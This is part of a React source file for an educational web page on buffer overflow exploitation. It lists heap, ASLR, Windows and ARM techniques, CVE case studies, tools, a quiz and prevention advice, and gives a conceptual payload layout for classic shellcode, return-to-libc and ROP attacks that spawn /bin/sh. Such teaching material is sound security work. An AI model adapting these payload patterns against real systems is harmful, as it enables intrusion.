                  </TableRow>
                ))}
              </TableBody>
            </Table>
          </TableContainer>

          <Accordion defaultExpanded sx={{ borderRadius: 2, mb: 5 }}>
            <AccordionSummary expandIcon={<ExpandMoreIcon />}>
              <Typography sx={{ fontWeight: 600 }}>
                <CodeIcon sx={{ mr: 1, verticalAlign: "middle", color: "#dc2626" }} />
                Basic Stack Overflow Exploitation
              </Typography>
            </AccordionSummary>
            <AccordionDetails>
              <CodeBlock title="Exploitation Flow (Conceptual)">
{`# 1. Find the vulnerability
#    - Identify buffer size (e.g., 64 bytes)
#    - Determine offset to return address

# 2. Calculate payload structure:
+--------------------------------------------------+
| [PADDING]     [RET ADDR]    [SHELLCODE/ROP]      |
| (64 bytes)    (4/8 bytes)   (variable)           |
+--------------------------------------------------+

# 3. Without protections - Classic shellcode:
payload = b"A" * 64           # Fill buffer
payload += b"BBBB"            # Overwrite saved EBP
payload += p32(shellcode_addr) # Overwrite return address
payload += shellcode          # Shellcode to execute

# 4. With NX enabled - Return-to-libc:
payload = b"A" * 64
payload += p32(system_addr)   # Address of system()
payload += p32(exit_addr)     # Return address for system
payload += p32(binsh_addr)    # Address of "/bin/sh"

# 5. With ASLR + NX - ROP chain:
payload = b"A" * 64
payload += rop_chain          # Gadgets to setup registers
                              # and call execve("/bin/sh")`}
              </CodeBlock>
            </AccordionDetails>
          </Accordion>

          {/* ==================== HEAP EXPLOITATION ==================== */}
          <Typography id="heap-exploitation" variant="h4" sx={{ fontWeight: 800, mb: 1, scrollMarginTop: 180 }}>
            Advanced Heap Exploitation Techniques
          </Typography>
          <Typography variant="body1" color="text.secondary" sx={{ mb: 3 }}>
            Exploiting dynamic memory allocator vulnerabilities
          </Typography>

          <Grid container spacing={2} sx={{ mb: 5 }}>
            {heapExploitTechniques.map((tech) => (
              <Grid item xs={12} md={6} key={tech.name}>
                <Card sx={{ height: "100%", borderLeft: `4px solid #f59e0b` }}>
                  <CardContent>
                    <Typography variant="subtitle1" sx={{ fontWeight: 700, color: "#f59e0b" }}>{tech.name}</Typography>
                    <Typography variant="body2" color="text.secondary" sx={{ mb: 1 }}>{tech.description}</Typography>
                    <Box sx={{ bgcolor: alpha("#f59e0b", 0.05), p: 1, borderRadius: 1, mb: 1 }}>
                      <Typography variant="caption" sx={{ fontWeight: 600 }}>Conditions: </Typography>
                      <Typography variant="caption">{tech.conditions}</Typography>
                    </Box>
                    <Typography variant="caption" sx={{ fontFamily: "monospace", color: "text.secondary" }}>
                      {tech.example}
                    </Typography>
                  </CardContent>
                </Card>
              </Grid>
            ))}
          </Grid>

          {/* ==================== ASLR BYPASS ==================== */}
          <Typography id="aslr-bypass" variant="h4" sx={{ fontWeight: 800, mb: 1, scrollMarginTop: 180 }}>
            ASLR Bypass Techniques
          </Typography>
          <Typography variant="body1" color="text.secondary" sx={{ mb: 3 }}>
            Methods to defeat address space layout randomization
          </Typography>

          <Grid container spacing={2} sx={{ mb: 5 }}>
            {aslrBypassTechniques.map((tech) => (
              <Grid item xs={12} md={6} key={tech.technique}>
                <Card sx={{ height: "100%" }}>
                  <CardContent>
                    <Typography variant="subtitle1" sx={{ fontWeight: 700, color: "#3b82f6" }}>{tech.technique}</Typography>
                    <Typography variant="body2" color="text.secondary" sx={{ mb: 2 }}>{tech.description}</Typography>
                    <List dense>
                      {tech.methods.map((method, idx) => (
                        <ListItem key={idx} sx={{ py: 0 }}>
                          <ListItemIcon sx={{ minWidth: 24 }}>
                            <ArrowRightIcon sx={{ fontSize: 14, color: "#3b82f6" }} />
                          </ListItemIcon>
                          <ListItemText primary={method} primaryTypographyProps={{ variant: "body2" }} />
                        </ListItem>
                      ))}
                    </List>
                  </CardContent>
                </Card>
              </Grid>
            ))}
          </Grid>

          {/* ==================== WINDOWS EXPLOITATION ==================== */}
          <Typography id="windows-exploitation" variant="h4" sx={{ fontWeight: 800, mb: 1, scrollMarginTop: 180 }}>
            Windows-Specific Exploitation
          </Typography>
          <Typography variant="body1" color="text.secondary" sx={{ mb: 3 }}>
            Platform-specific exploitation techniques for Windows
          </Typography>

          <TableContainer component={Paper} sx={{ borderRadius: 2, mb: 5 }}>
            <Table size="small">
              <TableHead>
                <TableRow sx={{ bgcolor: alpha("#8b5cf6", 0.1) }}>
                  <TableCell sx={{ fontWeight: 700 }}>Technique</TableCell>
                  <TableCell sx={{ fontWeight: 700 }}>Description</TableCell>
                  <TableCell sx={{ fontWeight: 700 }}>Details</TableCell>
                </TableRow>
              </TableHead>
              <TableBody>
                {windowsExploitTechniques.map((tech) => (
                  <TableRow key={tech.name}>
                    <TableCell sx={{ fontWeight: 600 }}>{tech.name}</TableCell>
                    <TableCell>{tech.description}</TableCell>
                    <TableCell sx={{ fontSize: "0.8rem" }}>
                      {tech.mitigation && <><strong>Mitigation:</strong> {tech.mitigation}<br /></>}
                      {tech.bypass && <><strong>Bypass:</strong> {tech.bypass}</>}
                      {tech.use && <><strong>Use:</strong> {tech.use}</>}
                      {tech.size && <><br /><strong>Size:</strong> {tech.size}</>}
                    </TableCell>
                  </TableRow>
                ))}
              </TableBody>
            </Table>
          </TableContainer>

          {/* ==================== ARM EXPLOITATION ==================== */}
          <Typography id="arm-exploitation" variant="h4" sx={{ fontWeight: 800, mb: 1, scrollMarginTop: 180 }}>
            ARM Architecture Exploitation
          </Typography>
          <Typography variant="body1" color="text.secondary" sx={{ mb: 3 }}>
            Exploitation on ARM processors and mobile devices
          </Typography>

          <Grid container spacing={2} sx={{ mb: 5 }}>
            {armExploitTechniques.map((tech) => (
              <Grid item xs={12} md={4} key={tech.name}>
                <Card sx={{ height: "100%", borderTop: `3px solid #22c55e` }}>
                  <CardContent>
                    <Typography variant="subtitle1" sx={{ fontWeight: 700, color: "#22c55e" }}>{tech.name}</Typography>
                    <Typography variant="body2" color="text.secondary" sx={{ mb: 2 }}>{tech.description}</Typography>
                    <Box sx={{ bgcolor: alpha("#22c55e", 0.05), p: 1, borderRadius: 1 }}>
                      <Typography variant="caption" sx={{ display: "block", mb: 0.5 }}>
                        <strong>{tech.difference ? "Key Difference" : tech.transition ? "Mode Transition" : "Registers"}:</strong>
                      </Typography>
                      <Typography variant="caption">
                        {tech.difference || tech.transition || tech.registers}
                      </Typography>
                    </Box>
                  </CardContent>
                </Card>
              </Grid>
            ))}
          </Grid>

          {/* ==================== REAL-WORLD CVES ==================== */}
          <Typography id="real-world-cves" variant="h4" sx={{ fontWeight: 800, mb: 1, scrollMarginTop: 180 }}>
            Notable Real-World Vulnerabilities
          </Typography>
          <Typography variant="body1" color="text.secondary" sx={{ mb: 3 }}>
            Famous buffer overflow CVEs and their impact
          </Typography>

          <TableContainer component={Paper} sx={{ borderRadius: 2, mb: 4 }}>
            <Table>
              <TableHead>
                <TableRow sx={{ bgcolor: alpha(theme.palette.primary.main, 0.05) }}>
                  <TableCell sx={{ fontWeight: 700 }}>CVE</TableCell>
                  <TableCell sx={{ fontWeight: 700 }}>Name</TableCell>
                  <TableCell sx={{ fontWeight: 700 }}>Type</TableCell>
                  <TableCell sx={{ fontWeight: 700 }}>Impact</TableCell>
                  <TableCell sx={{ fontWeight: 700 }}>Year</TableCell>
                </TableRow>
              </TableHead>
              <TableBody>
                {realWorldCVEs.map((cve) => (
                  <TableRow key={cve.cve} hover>
                    <TableCell sx={{ fontFamily: "monospace", fontWeight: 600 }}>{cve.cve}</TableCell>
                    <TableCell sx={{ fontWeight: 600 }}>{cve.name}</TableCell>
                    <TableCell>{cve.type}</TableCell>
                    <TableCell>
                      <Chip
                        label={cve.impact}
                        size="small"
                        sx={{
                          bgcolor: alpha("#dc2626", 0.15),
                          color: "#dc2626",
                          fontWeight: 600,
                        }}
                      />
                    </TableCell>
                    <TableCell>{cve.year}</TableCell>
                  </TableRow>
                ))}
              </TableBody>
            </Table>
          </TableContainer>

          {/* Detailed CVE Case Studies */}
          <Typography variant="h6" sx={{ fontWeight: 700, mt: 4, mb: 2 }}>
            <BugReportIcon sx={{ mr: 1, verticalAlign: "middle", color: "#dc2626" }} />
            Detailed Case Studies
          </Typography>
          {detailedCVEStudies.map((study) => (
            <Accordion key={study.cve} sx={{ mb: 2 }}>
              <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                <Box sx={{ display: "flex", alignItems: "center", gap: 2 }}>
                  <Chip label={study.cve.split(" ")[0]} size="small" sx={{ bgcolor: alpha("#dc2626", 0.1), color: "#dc2626" }} />
                  <Typography sx={{ fontWeight: 700 }}>{study.name}</Typography>
                </Box>
              </AccordionSummary>
              <AccordionDetails>
                <Grid container spacing={2}>
                  <Grid item xs={12} md={6}>
                    <Box sx={{ mb: 2 }}>
                      <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#3b82f6" }}>Discovery</Typography>
                      <Typography variant="body2">{study.discovery}</Typography>
                    </Box>
                    <Box sx={{ mb: 2 }}>
                      <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#3b82f6" }}>Description</Typography>
                      <Typography variant="body2">{study.description}</Typography>
                    </Box>
                    <Box>
                      <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#3b82f6" }}>Technical Details</Typography>
                      <Typography variant="body2">{study.technical}</Typography>
                    </Box>
                  </Grid>
                  <Grid item xs={12} md={6}>
                    <Box sx={{ mb: 2 }}>
                      <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#f59e0b" }}>Exploitation</Typography>
                      <Typography variant="body2">{study.exploitation}</Typography>
                    </Box>
                    <Box sx={{ mb: 2, p: 2, bgcolor: alpha("#dc2626", 0.05), borderRadius: 2 }}>
                      <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#dc2626" }}>Impact</Typography>
                      <Typography variant="body2">{study.impact}</Typography>
                    </Box>
                    <Box sx={{ p: 2, bgcolor: alpha("#22c55e", 0.05), borderRadius: 2 }}>
                      <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#22c55e" }}>Patch</Typography>
                      <Typography variant="body2">{study.patch}</Typography>
                    </Box>
                  </Grid>
                </Grid>
              </AccordionDetails>
            </Accordion>
          ))}

          <Accordion sx={{ borderRadius: 2, mb: 5, mt: 4 }}>
            <AccordionSummary expandIcon={<ExpandMoreIcon />}>
              <Typography sx={{ fontWeight: 600 }}>
                <HistoryIcon sx={{ mr: 1, verticalAlign: "middle", color: "#f59e0b" }} />
                Historical Timeline
              </Typography>
            </AccordionSummary>
            <AccordionDetails>
              <List dense>
                {[
                  { year: "1988", event: "Morris Worm - First major buffer overflow attack" },
                  { year: "1996", event: "Aleph One publishes 'Smashing the Stack for Fun and Profit'" },
                  { year: "2001", event: "Code Red worm exploits IIS buffer overflow" },
                  { year: "2003", event: "SQL Slammer worm spreads via SQL Server overflow" },
                  { year: "2008", event: "Conficker worm exploits MS08-067 buffer overflow" },
                  { year: "2014", event: "Heartbleed (CVE-2014-0160) disclosed" },
                  { year: "2017", event: "EternalBlue leaked, WannaCry ransomware" },
                  { year: "2019", event: "BlueKeep RDP vulnerability (CVE-2019-0708)" },
                  { year: "2021", event: "Baron Samedit sudo heap overflow" },
                  { year: "2022", event: "Dirty Pipe kernel vulnerability (CVE-2022-0847)" },
                ].map((item, idx) => (
                  <ListItem key={idx}>
                    <ListItemIcon>
                      <Chip label={item.year} size="small" sx={{ minWidth: 60 }} />
                    </ListItemIcon>
                    <ListItemText primary={item.event} />
                  </ListItem>
                ))}
              </List>
            </AccordionDetails>
          </Accordion>

          {/* ==================== TOOLS ==================== */}
          <Typography id="tools" variant="h4" sx={{ fontWeight: 800, mb: 1, scrollMarginTop: 180 }}>
            Analysis & Exploitation Tools
          </Typography>
          <Typography variant="body1" color="text.secondary" sx={{ mb: 3 }}>
            Essential tools for buffer overflow analysis and exploitation
          </Typography>

          <Grid container spacing={2} sx={{ mb: 4 }}>
            {analysisTools.map((tool) => (
              <Grid item xs={12} sm={6} md={3} key={tool.name}>
                <Card sx={{ height: "100%", borderRadius: 2 }}>
                  <CardContent>
                    <Typography variant="subtitle1" sx={{ fontWeight: 700 }}>
                      {tool.name}
                    </Typography>
                    <Chip
                      label={tool.category}
                      size="small"
                      sx={{ mb: 1, mt: 0.5 }}
                      color="primary"
                      variant="outlined"
                    />
                    <Typography variant="body2" color="text.secondary">
                      {tool.description}
                    </Typography>
                  </CardContent>
                </Card>
              </Grid>
            ))}
          </Grid>

          {/* GDB Debugging Examples */}
          <Typography variant="h6" sx={{ fontWeight: 700, mt: 4, mb: 2 }}>
            <BuildIcon sx={{ mr: 1, verticalAlign: "middle", color: "#8b5cf6" }} />
            GDB Debugging Examples
          </Typography>
          <Grid container spacing={2} sx={{ mb: 4 }}>
            {gdbExamples.map((example) => (
              <Grid item xs={12} md={6} key={example.title}>
                <Card sx={{ height: "100%" }}>
                  <CardContent>
                    <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#8b5cf6", mb: 1 }}>
                      {example.title}
                    </Typography>
                    <Box sx={{ bgcolor: alpha("#8b5cf6", 0.03), p: 2, borderRadius: 2 }}>
                      <pre style={{ margin: 0, fontSize: "0.75rem", fontFamily: "monospace", whiteSpace: "pre-wrap", overflow: "auto" }}>
                        {example.commands}
                      </pre>
                    </Box>
                  </CardContent>
                </Card>
              </Grid>
            ))}
          </Grid>

          <Accordion defaultExpanded sx={{ borderRadius: 2, mt: 4, mb: 5 }}>
            <AccordionSummary expandIcon={<ExpandMoreIcon />}>
              <Typography sx={{ fontWeight: 600 }}>
                <CodeIcon sx={{ mr: 1, verticalAlign: "middle", color: "#3b82f6" }} />
                Complete pwntools Exploit Template
              </Typography>
            </AccordionSummary>
            <AccordionDetails>
              <Typography variant="body2" color="text.secondary" sx={{ mb: 2 }}>
                A production-ready pwntools template with ASLR bypass, ROP chain building, and remote/local targeting.
              </Typography>
              <CodeBlock title="Python pwntools exploit template">
                {pwntoolsTemplate}
              </CodeBlock>
            </AccordionDetails>
          </Accordion>

          {/* ==================== PREVENTION ==================== */}
          <Typography id="prevention" variant="h4" sx={{ fontWeight: 800, mb: 1, scrollMarginTop: 180 }}>
            Prevention & Mitigation
          </Typography>
          <Typography variant="body1" color="text.secondary" sx={{ mb: 3 }}>
            Best practices for writing secure code
          </Typography>

          <Grid container spacing={3} sx={{ mb: 4 }}>
            {preventionMethods.map((method) => (
              <Grid item xs={12} sm={6} md={4} key={method.method}>
                <Card
                  sx={{
                    height: "100%",
                    borderRadius: 2,
                    borderLeft: `4px solid ${getSeverityColor(method.priority)}`,
                  }}
                >
                  <CardContent>
                    <Box sx={{ display: "flex", justifyContent: "space-between", alignItems: "flex-start", mb: 1 }}>
                      <Typography variant="subtitle1" sx={{ fontWeight: 700 }}>
                        {method.method}
                      </Typography>
                      <Chip
                        label={method.priority}
                        size="small"
                        sx={{
                          bgcolor: alpha(getSeverityColor(method.priority), 0.15),
                          color: getSeverityColor(method.priority),
                          fontWeight: 600,
                        }}
                      />
                    </Box>
                    <Typography variant="body2" color="text.secondary">
                      {method.description}
                    </Typography>
                  </CardContent>
                </Card>
              </Grid>
            ))}
          </Grid>

          <Paper sx={{ p: 3, borderRadius: 2, bgcolor: alpha("#22c55e", 0.05), border: `1px solid ${alpha("#22c55e", 0.2)}`, mb: 5 }}>
            <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
              <CheckCircleIcon sx={{ color: "#22c55e" }} />
              Secure Development Checklist
            </Typography>
            <Grid container spacing={2}>
              <Grid item xs={12} md={6}>
                <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#22c55e", mb: 1 }}>
                  DO
                </Typography>
                <List dense>
                  {[
                    "Use bounds-checked functions (strncpy, snprintf)",
                    "Enable all compiler protections",
                    "Validate input lengths before processing",
                    "Use memory-safe languages when possible",
                    "Run static analyzers and fuzzers",
                    "Keep dependencies updated",
                  ].map((item, idx) => (
                    <ListItem key={idx} sx={{ py: 0.5 }}>
                      <ListItemIcon sx={{ minWidth: 28 }}>
                        <ArrowRightIcon sx={{ color: "#22c55e" }} />
                      </ListItemIcon>
                      <ListItemText primary={item} primaryTypographyProps={{ variant: "body2" }} />
                    </ListItem>
                  ))}
                </List>
              </Grid>
              <Grid item xs={12} md={6}>
                <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#dc2626", mb: 1 }}>
                  DON'T
                </Typography>
                <List dense>
                  {[
                    "Use gets(), strcpy(), sprintf() without limits",
                    "Trust user input length claims",
                    "Disable compiler protections for performance",
                    "Ignore compiler warnings about buffer sizes",
                    "Use fixed-size buffers for variable-length data",
                    "Copy without checking destination size",
                  ].map((item, idx) => (
                    <ListItem key={idx} sx={{ py: 0.5 }}>
                      <ListItemIcon sx={{ minWidth: 28 }}>
                        <ArrowRightIcon sx={{ color: "#dc2626" }} />
                      </ListItemIcon>
                      <ListItemText primary={item} primaryTypographyProps={{ variant: "body2" }} />
                    </ListItem>
                  ))}
                </List>
              </Grid>
            </Grid>
          </Paper>

          {/* ==================== QUIZ ==================== */}
          <Paper
            id="quiz"
            sx={{
              mt: 4,
              p: 4,
              borderRadius: 3,
              border: `1px solid ${alpha(QUIZ_ACCENT_COLOR, 0.2)}`,
              scrollMarginTop: 180,
            }}
          >
            <Typography variant="h5" sx={{ fontWeight: 800, mb: 3, display: "flex", alignItems: "center", gap: 2 }}>
              <QuizIcon sx={{ color: QUIZ_ACCENT_COLOR }} />
              Knowledge Check
            </Typography>
            <QuizSection
              questions={quizQuestions}
              accentColor={QUIZ_ACCENT_COLOR}
              title="Buffer Overflow Knowledge Check"
              description="Random 10-question quiz drawn from a 75-question bank each time you start the quiz."
              questionsPerQuiz={QUIZ_QUESTION_COUNT}
            />
          </Paper>

          {/* Bottom Navigation */}
          <Box sx={{ mt: 4, textAlign: "center" }}>
            <Button
              variant="outlined"
              startIcon={<ArrowBackIcon />}
              onClick={() => navigate("/learn")}
              sx={{ borderColor: "#8b5cf6", color: "#8b5cf6" }}
            >
              Back to Learning Hub
            </Button>
          </Box>
        </Box>
      </Box>
    </LearnPageLayout>
  );
}
